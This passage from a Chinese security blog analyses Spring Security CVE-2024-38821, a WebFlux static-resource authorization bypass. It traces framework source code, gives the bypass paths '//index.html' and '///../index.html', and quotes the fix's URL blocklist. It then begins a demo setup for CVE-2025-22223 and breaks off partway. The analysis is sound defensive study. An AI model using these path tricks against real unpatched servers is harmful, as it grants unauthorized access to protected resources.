<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Mono&lt;Object&gt; <span class="title function_">getHandlerInternal</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="type">PathContainer</span> <span class="variable">lookupPath</span> <span class="operator">=</span> exchange.getRequest().getPath().pathWithinApplication();</span><br><span class="line"></span><br><span class="line">        Object handler;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            handler = <span class="built_in">this</span>.lookupHandler(lookupPath, exchange);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            <span class="keyword">return</span> Mono.error(var5);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Mono.justOrEmpty(handler);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>继续跟进到<code>lookupHandler</code>方法中  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">lookupHandler</span><span class="params">(PathContainer lookupPath, ServerWebExchange exchange)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        List&lt;PathPattern&gt; matches = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.handlerMap.keySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            <span class="type">PathPattern</span> <span class="variable">pattern</span> <span class="operator">=</span> (PathPattern)var4.next();</span><br><span class="line">            <span class="keyword">if</span> (pattern.matches(lookupPath)) &#123;</span><br><span class="line">                matches = matches != <span class="literal">null</span> ? matches : <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">                matches.add(pattern);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (matches == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (matches.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                matches.sort(PathPattern.SPECIFICITY_COMPARATOR);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isTraceEnabled()) &#123;</span><br><span class="line">                    <span class="type">Log</span> <span class="variable">var10000</span> <span class="operator">=</span> <span class="built_in">this</span>.logger;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">var10001</span> <span class="operator">=</span> exchange.getLogPrefix();</span><br><span class="line">                    var10000.debug(var10001 + <span class="string">&quot;Matching patterns &quot;</span> + matches);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">PathPattern</span> <span class="variable">pattern</span> <span class="operator">=</span> (PathPattern)matches.get(<span class="number">0</span>);</span><br><span class="line">            <span class="type">PathContainer</span> <span class="variable">pathWithinMapping</span> <span class="operator">=</span> pattern.extractPathWithinPattern(lookupPath);</span><br><span class="line">            PathPattern.<span class="type">PathMatchInfo</span> <span class="variable">matchInfo</span> <span class="operator">=</span> pattern.matchAndExtract(lookupPath);</span><br><span class="line">            Assert.notNull(matchInfo, <span class="string">&quot;Expected a match&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="built_in">this</span>.handlerMap.get(pattern);</span><br><span class="line">            <span class="keyword">if</span> (handler <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">handlerName</span> <span class="operator">=</span> (String)handler;</span><br><span class="line">                handler = <span class="built_in">this</span>.obtainApplicationContext().getBean(handlerName);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.handlerPredicate != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.handlerPredicate.test(handler, exchange)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.validateHandler(handler, exchange);</span><br><span class="line">                exchange.getAttributes().put(BEST_MATCHING_HANDLER_ATTRIBUTE, handler);</span><br><span class="line">                exchange.getAttributes().put(BEST_MATCHING_PATTERN_ATTRIBUTE, pattern);</span><br><span class="line">                ServerHttpObservationFilter.findObservationContext(exchange).ifPresent((context) -&gt; &#123;</span><br><span class="line">                    context.setPathPattern(pattern.toString());</span><br><span class="line">                &#125;);</span><br><span class="line">                ServerRequestObservationContext.findCurrent(exchange.getAttributes()).ifPresent((context) -&gt; &#123;</span><br><span class="line">                    context.setPathPattern(pattern.toString());</span><br><span class="line">                &#125;);</span><br><span class="line">                exchange.getAttributes().put(PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE, pathWithinMapping);</span><br><span class="line">                exchange.getAttributes().put(URI_TEMPLATE_VARIABLES_ATTRIBUTE, matchInfo.getUriVariables());</span><br><span class="line">                <span class="keyword">return</span> handler;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>重点关注下面两行代码  </p>
<blockquote>
<p>PathContainer pathWithinMapping &#x3D; pattern.extractPathWithinPattern(lookupPath);<br>exchange.getAttributes().put(PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE, pathWithinMapping);</p>
</blockquote>
<p>此时 pathWithinMapping 的path值已经被正确提取为<code>index.html</code>了，所以仍需向前回溯<br><img src="/archives/f65bb354/img_5.png" alt="img_5.png">  </p>
<p>可以发现 <code>PATH_WITHIN_HANDLER_MAPPING_ATTRIBUTE</code> 属性 是从 <code>lookupPath</code> 中提取出来的。<br>此时查看 <code>lookpath</code> 的值 是一个<code>PathContainer</code>对象，查看其值发现其<code>path</code>值为<code>//index.html</code><br><img src="/archives/f65bb354/img_6.png" alt="img_6.png"><br>所以从<code>//index.html</code>到<code>index.html</code>的转换是发生在 <code>extractPathWithinPattern</code>方法中的<br>该方法首先会从头开始遍历字符串path的每个元素，如果该元素是<code>Separator</code> 类型则将<code>startIndex</code> 加一，直到遇到一个不为<code>Separator</code>的元素为止，<br>然后从字符串末尾开始反向遍历遇到<code>Separator</code>类型的元素就将<code>endIndex</code>减一，遇到不是<code>Separator</code>的元素就停止遍历。<br>然后再从<code>startIndex</code>开始遍历直到<code>endIndex</code>结束，如果再次遇到了<code>Separator</code>类型元素就认为该路径是多层的，此时将<code>multipleAdjacentSeparators</code>设为true<br>我们的的例子不涉及<code>multipleAdjacent</code>这种情况，那么就截取<code>startIndex</code>到<code>endIndex</code>之间的元素，即<code>index.html</code>。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PathContainer <span class="title function_">extractPathWithinPattern</span><span class="params">(PathContainer path)</span> &#123;</span><br><span class="line">       List&lt;PathContainer.Element&gt; pathElements = path.elements();</span><br><span class="line">       <span class="type">int</span> <span class="variable">pathElementsCount</span> <span class="operator">=</span> pathElements.size();</span><br><span class="line">       <span class="type">int</span> <span class="variable">startIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       PathElement elem;</span><br><span class="line">       <span class="keyword">for</span>(elem = <span class="built_in">this</span>.head; elem != <span class="literal">null</span> &amp;&amp; elem.isLiteral(); ++startIndex) &#123;</span><br><span class="line">           elem = elem.next;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (elem == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> PathContainer.parsePath(<span class="string">&quot;&quot;</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">while</span>(startIndex &lt; pathElementsCount &amp;&amp; pathElements.get(startIndex) <span class="keyword">instanceof</span> PathContainer.Separator) &#123;</span><br><span class="line">               ++startIndex;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="type">int</span> endIndex;</span><br><span class="line">           <span class="keyword">for</span>(endIndex = pathElements.size(); endIndex &gt; <span class="number">0</span> &amp;&amp; pathElements.get(endIndex - <span class="number">1</span>) <span class="keyword">instanceof</span> PathContainer.Separator; --endIndex) &#123;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="type">boolean</span> <span class="variable">multipleAdjacentSeparators</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt; endIndex - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">               <span class="keyword">if</span> (pathElements.get(i) <span class="keyword">instanceof</span> PathContainer.Separator &amp;&amp; pathElements.get(i + <span class="number">1</span>) <span class="keyword">instanceof</span> PathContainer.Separator) &#123;</span><br><span class="line">                   multipleAdjacentSeparators = <span class="literal">true</span>;</span><br><span class="line">                   <span class="keyword">break</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="type">PathContainer</span> <span class="variable">resultPath</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">           <span class="keyword">if</span> (multipleAdjacentSeparators) &#123;</span><br><span class="line">               <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">               <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                   PathContainer.Element e;</span><br><span class="line">                   <span class="keyword">do</span> &#123;</span><br><span class="line">                       <span class="keyword">if</span> (i &gt;= endIndex) &#123;</span><br><span class="line">                           resultPath = PathContainer.parsePath(sb.toString(), <span class="built_in">this</span>.pathOptions);</span><br><span class="line">                           <span class="keyword">return</span> resultPath;</span><br><span class="line">                       &#125;</span><br><span class="line"></span><br><span class="line">                       e = (PathContainer.Element)pathElements.get(i++);</span><br><span class="line">                       sb.append(e.value());</span><br><span class="line">                   &#125; <span class="keyword">while</span>(!(e <span class="keyword">instanceof</span> PathContainer.Separator));</span><br><span class="line"></span><br><span class="line">                   <span class="keyword">while</span>(i &lt; endIndex &amp;&amp; pathElements.get(i) <span class="keyword">instanceof</span> PathContainer.Separator) &#123;</span><br><span class="line">                       ++i;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (startIndex &gt;= endIndex) &#123;</span><br><span class="line">               resultPath = PathContainer.parsePath(<span class="string">&quot;&quot;</span>);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               resultPath = path.subPath(startIndex, endIndex);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> resultPath;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>上面解释了为什么<code>//index.html</code>可以绕过认证，下面解释为什么<code>///../</code>也能绕过认证。<br><code>../</code>表示转到上一级目录，所以<code>///../index.html</code>会被<code>WebFlux</code>处理成<code>//index.html</code>，到了路径映射的时候仍然是处理<code>//</code>的问题。<br>下面对该漏洞的成因进行总结。<br>应用配置的需要用户授权的静态资源可通过构造特殊的请求路径进行绕过，原因在于攻击这构造的类似<code>//</code> 与<code>///../</code> 类型的请求因在过滤器中未能与设定的静态资源访问规则匹配，<br>从而绕过了过滤器验证，而在后续进行请求路径与服务器资源映射的过程中会针对该请求路径进行特殊处理，只提取路径两端<code>/</code>之间的内容作为服务器上资源的路径<br>从而导致了攻击者可以通过畸形请求路径访问受限静态资源。</p>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>通过对比<code>spring security</code> <code>v6.3.3</code>以及<code>v6.3.4</code>查看该漏洞的修复措施 <a href="https://github.com/spring-projects/spring-security/compare/6.3.3...6.3.4">diff链接</a><br>关键的修复在<code>WebFilterChainProxy</code>类中<br>通过新的类<code>StrictServerWebExchangeFirewall</code>来对请求路径进行过滤，并抛出异常，从而阻止请求继续执行。<br><img src="/archives/f65bb354/img_k.png" alt="img.png"><br><code>StrictServerWebExchangeFirewall</code> 是漏洞修复版本新创建的类，内容较多，这里不在贴出代码<a href="https://github.com/spring-projects/spring-security/blob/bb2fd24cd91276eaad900f6971d20371446b062a/web/src/main/java/org/springframework/security/web/server/firewall/StrictServerWebExchangeFirewall.java#L4">StrictServerWebExchangeFirewall</a><br>在上图的修复方案中调用的是<code>getFirewalledExchange</code>方法。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> Mono&lt;ServerWebExchange&gt; <span class="title function_">getFirewalledExchange</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> Mono.fromCallable(() -&gt; &#123;</span><br><span class="line">			<span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">			rejectForbiddenHttpMethod(request);</span><br><span class="line">			rejectedBlocklistedUrls(request); <span class="comment">// 对请求路径进行检查</span></span><br><span class="line">			rejectedUntrustedHosts(request);</span><br><span class="line">			<span class="keyword">if</span> (!isNormalized(request)) &#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServerExchangeRejectedException</span>(</span><br><span class="line">						<span class="string">&quot;The request was rejected because the URL was not normalized&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			exchange.getResponse().beforeCommit(() -&gt; Mono.fromRunnable(() -&gt; &#123;</span><br><span class="line">				<span class="type">ServerHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> exchange.getResponse();</span><br><span class="line">				<span class="type">HttpHeaders</span> <span class="variable">headers</span> <span class="operator">=</span> response.getHeaders();</span><br><span class="line">				<span class="keyword">for</span> (Map.Entry&lt;String, List&lt;String&gt;&gt; header : headers.entrySet()) &#123;</span><br><span class="line">					<span class="type">String</span> <span class="variable">headerName</span> <span class="operator">=</span> header.getKey();</span><br><span class="line">					List&lt;String&gt; headerValues = header.getValue();</span><br><span class="line">					<span class="keyword">for</span> (String headerValue : headerValues) &#123;</span><br><span class="line">						validateCrlf(headerName, headerValue);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;));</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StrictFirewallServerWebExchange</span>(exchange);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>对请求路径的检查发生在 <code>rejectedBlocklistedUrls</code>方法中  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">rejectedBlocklistedUrls</span><span class="params">(ServerHttpRequest request)</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> (String forbidden : <span class="built_in">this</span>.encodedUrlBlocklist) &#123;</span><br><span class="line">			<span class="keyword">if</span> (encodedUrlContains(request, forbidden)) &#123; <span class="comment">// 未进行url解码时的path</span></span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServerExchangeRejectedException</span>(</span><br><span class="line">						<span class="string">&quot;The request was rejected because the URL contained a potentially malicious String \&quot;&quot;</span></span><br><span class="line">								+ forbidden + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> (String forbidden : <span class="built_in">this</span>.decodedUrlBlocklist) &#123;</span><br><span class="line">			<span class="keyword">if</span> (decodedUrlContains(request, forbidden)) &#123; <span class="comment">// 获取的path是url解码后的path</span></span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServerExchangeRejectedException</span>(</span><br><span class="line">						<span class="string">&quot;The request was rejected because the URL contained a potentially malicious String \&quot;&quot;</span></span><br><span class="line">								+ forbidden + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>rejectedBlocklistedUrls</code>方法最终会调用到<code>valueContains</code><br>其中<code>value</code>是客户端请求的path，<code>container</code>是预定义的规则。当<code>value</code>是<code>container</code>的元素时，返回true，在上一级方法中将会抛出异常。<br>从而完成对漏洞的修复。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">valueContains</span><span class="params">(String value, String contains)</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> value != <span class="literal">null</span> &amp;&amp; value.contains(contains);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>container</code>的值在<code>StrictServerWebExchangeFirewall</code>实例化的时候被设置  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">StrictServerWebExchangeFirewall</span><span class="params">()</span> &#123;</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_SEMICOLON);</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_FORWARDSLASH);</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_DOUBLE_FORWARDSLASH);</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_BACKSLASH);</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_NULL);</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_LF);</span><br><span class="line">		urlBlocklistsAddAll(FORBIDDEN_CR);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">this</span>.encodedUrlBlocklist.add(ENCODED_PERCENT);</span><br><span class="line">		<span class="built_in">this</span>.encodedUrlBlocklist.addAll(FORBIDDEN_ENCODED_PERIOD);</span><br><span class="line">		<span class="built_in">this</span>.decodedUrlBlocklist.add(PERCENT);</span><br><span class="line">		<span class="built_in">this</span>.decodedUrlBlocklist.addAll(FORBIDDEN_LINE_SEPARATOR);</span><br><span class="line">		<span class="built_in">this</span>.decodedUrlBlocklist.addAll(FORBIDDEN_PARAGRAPH_SEPARATOR);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><code>FORBIDDEN_SEMICOLON</code>等时一些被预定义的常量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ENCODED_PERCENT</span> <span class="operator">=</span> <span class="string">&quot;%25&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PERCENT</span> <span class="operator">=</span> <span class="string">&quot;%&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_ENCODED_PERIOD = Collections</span><br><span class="line">		.unmodifiableList(Arrays.asList(<span class="string">&quot;%2e&quot;</span>, <span class="string">&quot;%2E&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_SEMICOLON = Collections</span><br><span class="line">		.unmodifiableList(Arrays.asList(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;%3b&quot;</span>, <span class="string">&quot;%3B&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_FORWARDSLASH = Collections</span><br><span class="line">		.unmodifiableList(Arrays.asList(<span class="string">&quot;%2f&quot;</span>, <span class="string">&quot;%2F&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_DOUBLE_FORWARDSLASH = Collections</span><br><span class="line">		.unmodifiableList(Arrays.asList(<span class="string">&quot;//&quot;</span>, <span class="string">&quot;%2f%2f&quot;</span>, <span class="string">&quot;%2f%2F&quot;</span>, <span class="string">&quot;%2F%2f&quot;</span>, <span class="string">&quot;%2F%2F&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_BACKSLASH = Collections</span><br><span class="line">		.unmodifiableList(Arrays.asList(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;%5c&quot;</span>, <span class="string">&quot;%5C&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_NULL = Collections.unmodifiableList(Arrays.asList(<span class="string">&quot;\0&quot;</span>, <span class="string">&quot;%00&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_LF = Collections.unmodifiableList(Arrays.asList(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;%0a&quot;</span>, <span class="string">&quot;%0A&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_CR = Collections.unmodifiableList(Arrays.asList(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;%0d&quot;</span>, <span class="string">&quot;%0D&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_LINE_SEPARATOR = Collections.unmodifiableList(Arrays.asList(<span class="string">&quot;\u2028&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; FORBIDDEN_PARAGRAPH_SEPARATOR = Collections</span><br><span class="line">		.unmodifiableList(Arrays.asList(<span class="string">&quot;\u2029&quot;</span>));</span><br></pre></td></tr></table></figure>
<p><code>FORBIDDEN_DOUBLE_FORWARDSLASH</code>就是我们使用的<code>//</code></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://github.com/spring-projects/spring-security/compare/6.3.3...6.3.4">代码diff</a></li>
<li><a href="https://spring.io/security/cve-2024-38821">Authorization Bypass of Static Resources in WebFlux Applications</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>认证绕过</tag>
        <tag>漏洞分析</tag>
        <tag>Spring Security</tag>
        <tag>WebFlux</tag>
        <tag>CVE-2024-38821</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring-Security-EnableMethodSecurity注解授权绕过（CVE-2025-22223）</title>
    <url>/archives/93b95985.html</url>
    <content><![CDATA[<h1 id="Spring-Security-EnableMethodSecurity注解授权绕过（CVE-2025-22223）"><a href="#Spring-Security-EnableMethodSecurity注解授权绕过（CVE-2025-22223）" class="headerlink" title="Spring-Security-EnableMethodSecurity注解授权绕过（CVE-2025-22223）"></a>Spring-Security-EnableMethodSecurity注解授权绕过（CVE-2025-22223）</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><img src="/archives/93b95985/img.png" alt="img.png"><br>该漏洞影响 Spring Security 6.4.0 - 6.4.3 版本，再6.4.4 版本做了修复  </p>
<h2 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h2><p>通过漏洞描述我们知道该漏洞的触发需要使用 <code>EnableMethodSecurity</code> 注解，并且在泛型父类，接口，重写方法上使用了方法安全注解，<br>如：<code>@PreAuthorize(&quot;hasRole(&#39;ADMIN&#39;)&quot;) @Secured(&quot;ROLE_ADMIN&quot;) @PreFilter(&quot;filterObject.owner == authentication.name&quot;) @PostFilter(&quot;filterObject.owner == authentication.name&quot;)</code> 等<br>首先我们需要构造一个<code>spring Security</code>的项目 这里使用<code>spring boot</code>构造<br><code>spring-boot-starter-parent </code>版本为 <code>3.4.3 </code> 该版本使用的<code>spring security </code>版本为 <code>6.4.3</code> 刚好符合要求<br>创建<code>spring boot</code>入口类  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(DemoApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>创建 spring web 配置类  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.builders.HttpSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.web.SecurityFilterChain;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSecurityConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">                .authorizeHttpRequests(authorize -&gt; authorize</span><br><span class="line">                        .requestMatchers(<span class="string">&quot;/test&quot;</span>).permitAll()</span><br><span class="line">                        .anyRequest().authenticated()</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建 方法安全配置类  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.config;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableMethodSecurity(</span></span><br><span class="line"><span class="meta">        prePostEnabled = true, // 启用 @PreAuthorize, @PostAuthorize 等注解</span></span><br><span class="line"><span class="meta">        securedEnabled = true, // 启用 @Secured 注解</span></span><br><span class="line"><span class="meta">        jsr250Enabled = true   // 启用 @RolesAllowed, @PermitAll, @DenyAll 注解</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodSecurityConfig</span>  &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>创建方法授权控制服务基类<br>在该基类中定义了抽象方法 <code>securedMethod</code> 该方法将被子类继承实现，并使用 <code>@Secured</code> 注解进行方法安全控制<br>只有具有<code>ROLE_USER</code> 或 <code>ROLE_ADMIN</code> 角色的用户可以访问该方法  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.security.access.annotation.Secured;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">SecureServiceParent</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="meta">@Secured(&#123;&quot;ROLE_USER&quot;, &quot;ROLE_ADMIN&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">abstract</span> T  <span class="title function_">securedMethod</span><span class="params">(T t)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>创建子类，子类实现父类方法 <code>securedMethod</code>  </p>
